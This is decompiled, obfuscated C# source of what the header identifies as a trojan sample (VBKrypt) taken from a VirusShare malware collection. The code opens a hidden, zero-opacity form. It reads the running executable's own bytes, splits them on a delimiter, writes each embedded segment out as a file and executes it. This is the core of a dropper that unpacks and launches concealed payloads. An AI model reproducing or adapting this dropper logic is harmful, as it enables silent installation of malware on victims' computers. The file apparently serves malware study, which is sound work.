// Decompiled with JetBrains decompiler
// Type: .
// Assembly: TraMPsex12, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 97741F31-861F-48C4-BE07-00B34EA2F131
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.VBKrypt.orqg-dfe3add775ff2f3193e513644e67ceb77583fac9e4d24471f9646a9c2fd991b3.exe

using \u0001;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace \u0005
{
  internal class \u0001 : Form
  {
    [NonSerialized]
    internal static \u0002 \u0001;
    private IContainer \u0001;
    private int \u0001;
    private int \u0002;

    [DebuggerNonUserCode]
    public \u0001()
    {
      \u0005\u0003 obj1 = \u0005\u0003.\u001E\u0004;
      \u0005.\u0001 obj2 = this;
      // ISSUE: virtual method pointer
      EventHandler eventHandler = new EventHandler((object) obj2, __vmethodptr(obj2, \u0003));
      obj1((object) this, eventHandler);
      this.\u0003();
    }

    [DebuggerNonUserCode]
    protected override void Dispose([In] bool obj0)
    {
      try
      {
        if (!obj0 || this.\u0001 == null)
          return;
        \u0011\u0003.\u007E\u0098((object) this.\u0001);
      }
      finally
      {
        \u0096.\u007F\u0004((object) this, obj0);
      }
    }

    private void \u0003()
    {
      \u0011\u0003.\u007E\u0014\u0004((object) this);
      \u001A\u0002.\u007E\u0015\u0004((object) this, new SizeF(6f, 13f));
      \u009B\u0002.\u007E\u0016\u0004((object) this, AutoScaleMode.Font);
      \u0017\u0002.\u007E\u0019\u0004((object) this, new Size(10, 10));
      \u0018\u0002.\u007E\u0018\u0004((object) this, FormBorderStyle.None);
      \u0096.\u007E\u001A\u0004((object) this, false);
      \u001E\u0002.\u007E\u0011\u0004((object) this, \u0005.\u0001.\u0001(930));
      \u0015\u0003.\u007E\u001B\u0004((object) this, 0.0);
      \u0096.\u007E\u001D\u0004((object) this, false);
      \u0096.\u007E\u001C\u0004((object) this, false);
      \u0096.\u007E\u0013\u0004((object) this, false);
    }

    private void \u0003([In] object obj0, [In] EventArgs obj1) => this.\u0004();

    public void \u0004()
    {
      \u0015\u0003.\u007E\u001B\u0004((object) this, 0.0);
      \u0096.\u007E\u0012\u0004((object) this, false);
      try
      {
        string str1 = \u001C\u0003.\u008A\u0003();
        \u0096\u0002.\u001B(1, \u001C\u0003.\u0008\u0004(), OpenMode.Binary, OpenAccess.Read, OpenShare.Shared, -1);
        string str2 = \u0087\u0002.\u0084(checked ((int) \u008C\u0002.\u001F(1)));
        \u0082\u0002.\u001D(1, ref str2, -1L, false);
        int[] numArray1 = new int[1]{ 1 };
        \u0080\u0003.\u001C(numArray1);
        string[] source = \u009C.\u0086(str2, \u0005.\u0001.\u0001(939), -1, CompareMethod.Binary);
        this.\u0001 = 1;
        this.\u0002 = 2;
        int num1 = ((IEnumerable<string>) source).Count<string>();
        int num2 = 0;
        while (num2 <= num1)
        {
          \u0096\u0002.\u001B(3, \u0004\u0002.\u0005\u0002(str1, \u0005.\u0001.\u0001(1137), source[this.\u0001]), OpenMode.Binary, OpenAccess.ReadWrite, OpenShare.Default, -1);
          \u009E\u0002.\u001E(3, source[this.\u0002], -1L, false);
          int[] numArray2 = new int[1]{ 3 };
          \u0080\u0003.\u001C(numArray2);
          Process process = \u0017\u0003.\u0006\u0004(\u0004\u0002.\u0005\u0002(str1, \u0005.\u0001.\u0001(1137), source[this.\u0001]));
          checked { this.\u0001 += 2; }
          checked { this.\u0002 += 2; }
          checked { ++num2; }
        }
        \u0011\u0003.\u007E\u001F\u0004((object) this);
        \u0006\u0003.\u0082();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0011\u0003.\u007E\u001F\u0004((object) this);
        \u0006\u0003.\u0082();
        \u0006\u0003.\u0081();
      }
      \u0006\u0003.\u0082();
      \u0006\u0003.\u0082();
    }

    static \u0001() => \u0003.\u0003();
  }
}
